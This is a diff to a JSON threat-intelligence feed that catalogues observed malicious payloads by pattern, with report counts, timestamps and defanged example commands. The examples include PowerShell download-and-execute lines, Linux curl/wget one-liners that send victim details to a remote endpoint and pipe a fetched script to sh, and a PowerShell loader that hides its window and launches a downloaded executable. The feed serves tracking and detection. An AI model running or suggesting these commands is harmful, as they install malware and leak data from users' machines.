@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 123,
-    "ReportCount": 123,
+    "DistinctPayloadCount": 124,
+    "ReportCount": 124,
     "FirstSeen": "2026-11-18T04:11:27.895000+00:00",
-    "LastSeen": "2026-11-24T20:34:48.651000+00:00",
+    "LastSeen": "2026-11-25T02:32:07.384000+00:00",
     "ReportIds": [
       "cmwlltm271k7m0omlj7e36c2f",
       "cmwlmowug1kew0omlj08cauyz",
@@ -128,7 +128,8 @@
       "cmwv2vc0b0cn20nmlwq65u37w",
       "cmwv2yx180cw80nml5hla7v62",
       "cmwv3brgd0d650nmlz6sqlmmc",
-      "cmwv5lbd80dk00nmlcqi5wclc"
+      "cmwv5lbd80dk00nmlcqi5wclc",
+      "cmwvictk00ep70nmlz5fj9rod"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/045dc45870c27c02'|iex;",
@@ -224,6 +225,7 @@
       "irm 'img-codes-cloude[.]info/3103db9e23ffe1f2'|iex;",
       "irm 'img-codes-cloude[.]info/3458de5112653301'|iex;",
       "irm 'img-codes-cloude[.]info/3ebc229a76f38212'|iex;",
+      "irm 'img-codes-cloude[.]info/41d88dcc57a5f96c'|iex;",
       "irm 'img-codes-cloude[.]info/4349f1daacd50bcc'|iex;",
       "irm 'img-codes-cloude[.]info/437dc7e50c68cd86'|iex;",
       "irm 'img-codes-cloude[.]info/4bcc3365f865c038'|iex;",
@@ -258,10 +260,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 106,
-    "ReportCount": 106,
+    "DistinctPayloadCount": 108,
+    "ReportCount": 108,
     "FirstSeen": "2026-11-18T03:01:45.293000+00:00",
-    "LastSeen": "2026-11-24T20:57:34.237000+00:00",
+    "LastSeen": "2026-11-25T01:36:34.706000+00:00",
     "ReportIds": [
       "cmwljbytb1jwa0omlrmiaavfj",
       "cmwljnrpx1k140omlyyd1hsig",
@@ -368,7 +370,9 @@
       "cmwv1x36l0b8l0nmlxoggkbf7",
       "cmwv2awoh0c040nmlb3t1x1r7",
       "cmwv2bev40c1c0nmlp2nfzdw7",
-      "cmwv6el320ed70nmlujb2l3l4"
+      "cmwv6el320ed70nmlujb2l3l4",
+      "cmwvgcc250ejp0nml79vyx8ba",
+      "cmwvgde1d0elj0nmlvb8f17fw"
     ],
     "PayloadExamples": [
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/0164f0f9b6033a37')|iex",
@@ -429,6 +433,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/949cd932a9b4bd42')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/9beed38f887f936f')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a3d86f2e72d08c5e')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a44602b46c6fe499')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a49871b1ae44d6d5')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a7a68d1534d986f1')|iex",
@@ -442,6 +447,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b45bf9d8b81fb9eb')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b46abcf84e5ae26d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8c645092d9aa718')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8fd8c7cc531af4a')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b9e1b8494cf52e32')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ba4873e5c111ee58')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/bc80cbabe7050d7d')|iex",
@@ -481,12 +487,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && wget -qO- '<URL>' -L | sh",
-    "DistinctPayloadCount": 42,
-    "ReportCount": 42,
-    "FirstSeen": "2026-11-18T02:26:12.795000+00:00",
+    "DistinctPayloadCount": 41,
+    "ReportCount": 41,
+    "FirstSeen": "2026-11-18T02:36:27.752000+00:00",
     "LastSeen": "2026-11-24T20:38:56.659000+00:00",
     "ReportIds": [
-      "cmwli29bg1j3e0omltxtam4iu",
       "cmwliffs71jg90omldft1fkjb",
       "cmwlig0zv1jhr0omlt4lpcr6h",
       "cmwln39jm1lpq0omlob45cz8c",
@@ -536,7 +541,6 @@
       "curl -sL -d \"id=475c2e82-40b8-4a03-9bea-e9036c8286df&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fuktopthesis[.]co[.]uk%2F&os=Linux%20x86_64&lastVisitAt=2026-11-22T12%3A18%3A54.377Z&lastShellAt=2026-11-22T12%3A18%3A54.377Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=4a0a0daf-c7d6-4513-bd87-3444e0d9de2d&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fcreativecornerbd[.]shop%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A49%3A29.801Z&lastShellAt=2026-11-21T17%3A49%3A29.801Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=4cadef93-7fcb-4dce-84b4-54cedbcdb9b5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbc-aba[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A35%3A33.317Z&lastShellAt=2026-11-18T02%3A35%3A33.317Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-      "curl -sL -d \"id=5039c6b3-3efd-40e2-bc0f-b88a8d598c79&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhypevision[.]online%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A24%3A47.452Z&lastShellAt=2026-11-18T02%3A24%3A47.452Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=5269113f-ef1c-4d48-b4cf-3db883f1a2c1&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhangchaxenang[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A51%3A25.192Z&lastShellAt=2026-11-18T04%3A51%3A25.192Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=561e2d47-1a95-4137-80a6-ce6753636aef&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnutrinuts.co.ke%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A03%3A12.706Z&lastShellAt=2026-11-21T18%3A03%3A12.706Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
       "curl -sL -d \"id=57b4435a-0b39-4db6-9702-81be6db5ccd0&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmurdocknaturalhealing[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T18%3A03%3A55.811Z&lastShellAt=2026-11-21T18%3A03%3A55.811Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
@@ -576,12 +580,11 @@
   },
   {
     "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 29,
-    "ReportCount": 29,
-    "FirstSeen": "2026-11-18T02:24:02.267000+00:00",
+    "DistinctPayloadCount": 28,
+    "ReportCount": 28,
+    "FirstSeen": "2026-11-18T02:35:23.523000+00:00",
     "LastSeen": "2026-11-24T20:47:57.336000+00:00",
     "ReportIds": [
-      "cmwlhzglo1ix20oml8bipu4in",
       "cmwlie27f1jf00oml3vgpb6ov",
       "cmwln5uyj1lx60omlbspijyaf",
       "cmwln741b1lyb0oml7voas50m",
@@ -615,7 +618,6 @@
       "curl -sL -d \"id=04600905-4462-4242-9632-8d97bf31e261&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fbasourcinghub[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A55%3A52.223Z&lastShellAt=2026-11-18T04%3A55%3A52.223Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=08428965-24fe-4b16-a4b8-4c6691d63fc6&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fdirectenglish.com.sa%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T04%3A58%3A38.151Z&lastShellAt=2026-11-18T04%3A58%3A38.151Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=0d5c0c7c-70b5-4fe5-81d1-4e871657ea04&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fnuveenawellness.win%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A06%3A56.476Z&lastShellAt=2026-11-18T05%3A06%3A56.476Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-      "curl -sL -d \"id=0d61955f-893f-48ee-b377-935766c502e5&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgreenbeauty-shop[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T02%3A22%3A38.411Z&lastShellAt=2026-11-18T02%3A22%3A38.411Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=15e7c3a4-c67a-439f-9174-32760c4005ea&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Flafx.asia%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A41%3A03.064Z&lastShellAt=2026-11-18T05%3A41%3A03.064Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=1a73d73f-6a38-4e6a-9633-97d69f839c20&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmfwasia[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-21T17%3A59%3A28.603Z&lastShellAt=2026-11-21T17%3A59%3A28.603Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
       "curl -sL -d \"id=1a88e831-fd96-4328-8d29-e64a56252b73&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fhandhportland[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T05%3A00%3A42.455Z&lastShellAt=2026-11-18T05%3A00%3A42.455Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
@@ -850,6 +852,20 @@
     ]
   },
   {
+    "Pattern": "$url = \"<URL>\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-24T16:38:51.545000+00:00",
+    "LastSeen": "2026-11-25T02:31:36.239000+00:00",
+    "ReportIds": [
+      "cmwux5vn3069i0nml8k905ktr",
+      "cmwvic5jb0enp0nmlyqy9objn"
+    ],
+    "PayloadExamples": [
+      "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
+    ]
+  },
+  {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
     "ReportCount": 2,
@@ -861,19 +877,6 @@
     ],
     "PayloadExamples": [
       "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
-    ]
-  },
-  {
-    "Pattern": "$url = \"<URL>\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-24T16:38:51.545000+00:00",
-    "LastSeen": "2026-11-24T16:38:51.545000+00:00",
-    "ReportIds": [
-      "cmwux5vn3069i0nml8k905ktr"
-    ],
-    "PayloadExamples": [
-      "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
     ]
   },
   {
